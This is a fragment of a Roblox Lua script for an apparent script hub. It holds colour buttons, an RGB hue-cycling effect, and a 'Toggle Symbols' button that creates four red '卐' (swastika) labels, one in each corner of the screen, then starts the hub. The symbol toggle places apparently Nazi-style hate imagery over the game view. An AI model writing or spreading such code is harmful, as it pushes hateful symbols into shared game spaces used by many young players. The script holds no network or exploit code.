symbolsTab:Button({Title = "⚫ Negro", Callback = function() setCornerColor(Color3.fromRGB(20,20,20)) end})
symbolsTab:Button({Title = "🎨 RGB", Callback = function()
    local startTime = tick()
    local conn
    conn = RunService.Heartbeat:Connect(function(dt)
        if cornerSymbols and #cornerSymbols > 0 and cornerSymbols[1] and cornerSymbols[1].Parent then
            local elapsed = tick() - startTime
            local hue = (elapsed * 0.5) % 1
            local col = Color3.fromHSV(hue, 1, 1)
            setCornerColor(col)
        else
            conn:Disconnect()
        end
    end)
end})
symbolsTab:Button({Title = "🔁 Toggle Symbols", Callback = function()
    cornerSymbolsEnabled = not cornerSymbolsEnabled
    if cornerSymbolsEnabled then
        if not cornerSymbols or #cornerSymbols == 0 then
            local positions = {
                UDim2.new(0,10,0,10), UDim2.new(1,-58,0,10), UDim2.new(0,10,1,-58), UDim2.new(1,-58,1,-58)
            }
            for _, pos in ipairs(positions) do
                local s = Instance.new("TextLabel", EffectsGui)
                s.Size = UDim2.new(0,48,0,48)
                s.Position = pos
                s.BackgroundTransparency = 1
                s.Text = "卐"
                s.Font = Enum.Font.GothamBold
                s.TextSize = 36
                s.TextColor3 = Color3.fromRGB(255,60,60)
                s.Rotation = 0
                table.insert(cornerSymbols, s)
            end
        else
            for _, s in ipairs(cornerSymbols) do if s and s.Parent then s.Visible = true end end
        end
    else
        for _, s in ipairs(cornerSymbols) do if s and s.Parent then s.Visible = false end end
    end
end})

task.spawn(function()
    task.wait(0.5)
    startHub()
end)
